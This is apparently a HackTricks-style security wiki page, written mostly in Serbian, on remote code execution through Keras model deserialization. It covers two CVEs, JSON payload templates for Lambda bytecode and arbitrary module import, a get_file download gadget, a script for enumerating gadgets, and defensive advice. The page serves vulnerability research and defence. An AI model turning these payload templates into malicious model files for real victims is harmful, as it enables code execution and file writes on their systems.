# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ova stranica sumira praktične tehnike eksploatacije protiv Keras modela deserializacije, objašnjava unutrašnjost .keras formata i površinu napada, i pruža alat za istraživače za pronalaženje ranjivosti Model File Vulnerabilities (MFVs) i post-fix gadgeta.

## .keras model format internals

A .keras file is a ZIP archive containing at least:
- metadata.json – generičke informacije (npr., Keras verzija)
- config.json – arhitektura modela (primarna površina napada)
- model.weights.h5 – težine u HDF5

The config.json drives recursive deserialization: Keras imports modules, resolves classes/functions and reconstructs layers/objects from attacker-controlled dictionaries.

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserijalizacija obavlja:
- Uvoz modula i rešavanje simbola iz module/class_name ključeva
- from_config(...) ili poziv konstruktora sa argumentima koje kontroliše napadač
- Rekurzija u ugnježdene objekte (aktivacije, inicijalizatori, ograničenja, itd.)

Istorijski, ovo je izložilo tri primitiva napadaču koji kreira config.json:
- Kontrola nad tim koji se moduli uvoze
- Kontrola nad tim koje se klase/funkcije rešavaju
- Kontrola nad argumentima prosleđenim u konstruktore/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Osnovni uzrok:
- Lambda.from_config() koristi python_utils.func_load(...) koji base64-dekodira i poziva marshal.loads() na bajtovima napadača; Python unmarshalling može izvršiti kod.

Ideja za eksploataciju (pojednostavljeni payload u config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigacija:
- Keras podrazumevano primenjuje safe_mode=True. Serijalizovane Python funkcije u Lambda su blokirane osim ako korisnik eksplicitno ne odabere safe_mode=False.

Napomene:
- Nasleđeni formati (stariji HDF5 sačuvani podaci) ili starije kodne baze možda ne primenjuju moderne provere, tako da "downgrade" stil napada i dalje može da se primeni kada žrtve koriste starije učitavače.

## CVE-2025-1550 – Arbitrarna uvoz modula u Keras ≤ 3.8

Osnovni uzrok:
- _retrieve_class_or_fn koristi neograničeni importlib.import_module() sa stringovima modula koje kontroliše napadač iz config.json.
- Uticaj: Arbitraran uvoz bilo kog instaliranog modula (ili modula koji je napadač postavio na sys.path). Kod se izvršava u vreme uvoza, a zatim se vrši konstrukcija objekta sa napadačevim kwargs.

Ideja za eksploataciju:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):
- Module allowlist: uvozi su ograničeni na zvanične ekosistem module: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True blokira učitavanje nesigurnih Lambda serijalizovanih funkcija
- Basic type checking: deserializovani objekti moraju odgovarati očekivanim tipovima

## Post-fix gadget surface inside allowlist

Čak i sa allowlisting-om i safe mode-om, široka površina ostaje među dozvoljenim Keras pozivima. Na primer, keras.utils.get_file može preuzeti proizvoljne URL-ove na lokacije koje korisnik odabere.

Gadget putem Lambda koji se poziva na dozvoljenu funkciju (ne serijalizovani Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Važno ograničenje:
- Lambda.call() dodaje ulazni tenzor kao prvi pozicioni argument prilikom pozivanja ciljne funkcije. Odabrani gadgeti moraju tolerisati dodatni pozicioni argument (ili prihvatiti *args/**kwargs). Ovo ograničava koje funkcije su izvodljive.

Potencijalni uticaji dozvoljenih gadgeta:
- Arbitrerno preuzimanje/pisanje (postavljanje putanja, trovanje konfiguracije)
- Mrežni povratni pozivi/SSRF-efekti u zavisnosti od okruženja
- Povezivanje sa izvršavanjem koda ako su napisane putanje kasnije uvezene/izvršene ili dodate u PYTHONPATH, ili ako postoji lokacija za izvršavanje na pisanje

## Alatke istraživača

1) Sistematsko otkrivanje gadgeta u dozvoljenim modulima

Enumerisati kandidate funkcija u keras, keras_nlp, keras_cv, keras_hub i dati prioritet onima sa efektima na datoteke/mrežu/proces/okruženje.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Direktno testiranje deserializacije (nije potreban .keras arhiv)

Unesite kreirane rečnike direktno u Keras deserializer-e da biste saznali prihvaćene parametre i posmatrali nuspojave.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Istraživanje između verzija i formata

Keras postoji u više kodnih baza/era sa različitim zaštitnim merama i formatima:
- TensorFlow ugrađeni Keras: tensorflow/python/keras (nasleđe, planirano za brisanje)
- tf-keras: održava se odvojeno
- Multi-backend Keras 3 (službeni): uveden je .keras format

Ponovite testove između kodnih baza i formata (.keras vs nasleđe HDF5) kako biste otkrili regresije ili nedostajuće zaštite.

## Preporuke za odbranu

- Tretirajte datoteke modela kao nepouzdani ulaz. Učitajte modele samo iz pouzdanih izvora.
- Održavajte Keras ažuriranim; koristite Keras ≥ 3.9 da biste imali koristi od dozvola i provere tipova.
- Ne postavljajte safe_mode=False prilikom učitavanja modela osim ako potpuno ne verujete datoteci.
- Razmotrite pokretanje deserializacije u izolovanom, najmanje privilegovanom okruženju bez mrežnog izlaza i sa ograničenim pristupom datotečnom sistemu.
- Sprovodite dozvole/potpisivanje za izvore modela i proveru integriteta gde god je to moguće.

## Reference

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
